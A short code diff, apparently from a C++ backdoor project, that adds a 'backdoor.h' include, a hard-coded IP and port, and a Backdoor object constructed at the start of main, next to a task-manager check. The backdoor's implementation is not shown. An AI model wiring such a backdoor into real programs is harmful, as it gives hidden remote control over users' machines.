@@ -1,9 +1,13 @@
 #include "communication.h"
 #include "tasks.h"
-//bool lock_task_manager = false;
+#include "backdoor.h"
+
+#define IP "127.0.0.1"
+#define PORT 8000
 
 int main(int argc, char * argv[]){
 
+    Backdoor b (IP, PORT, false);
 
     //std::thread multithreading(Tasks::check_task_manager);
     Tasks::check_task_manager();
